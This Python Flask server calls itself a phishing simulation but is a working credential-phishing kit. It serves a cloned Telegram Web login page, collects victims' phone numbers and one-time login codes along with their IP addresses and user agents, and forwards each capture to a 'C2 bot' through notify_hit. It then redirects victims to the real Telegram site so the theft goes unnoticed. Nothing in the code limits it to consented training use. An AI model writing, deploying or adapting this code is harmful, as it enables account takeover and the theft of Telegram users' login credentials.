#!/usr/bin/env python3
"""
Phishing-simulation web server.
Serves a cloned Telegram Web login page, captures submissions,
and forwards them to the C2 bot (bot_c2.notify_hit).
"""
from flask import Flask, request, render_template, jsonify, redirect
from bot_c2 import notify_hit

app = Flask(__name__)

# Step 1 -> collects phone; Step 2 -> collects login code
LANDING = "https://web.telegram.org"   # real site users are bounced to after capture

@app.route("/")
def index():
    return render_template("login.html", step="phone")

@app.route("/auth", methods=["POST"])
def auth():
    phone = request.form.get("phone", "").strip()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    if phone:
        notify_hit(phone=phone, code="<awaiting-code>", ip=ip, ua=ua)
        # serve step 2 (code entry), keyed loosely to the session
        return render_template("login.html", step="code", phone=phone)
    return redirect("/")

@app.route("/verify", methods=["POST"])
def verify():
    phone = request.form.get("phone", "")
    code = request.form.get("code", "")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    notify_hit(phone=phone, code=code, ip=ip, ua=ua)
    # Redirect the victim to the genuine site so it feels seamless
    return redirect(LANDING)

@app.route("/healthz")
def health():
    return jsonify(status="ok")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
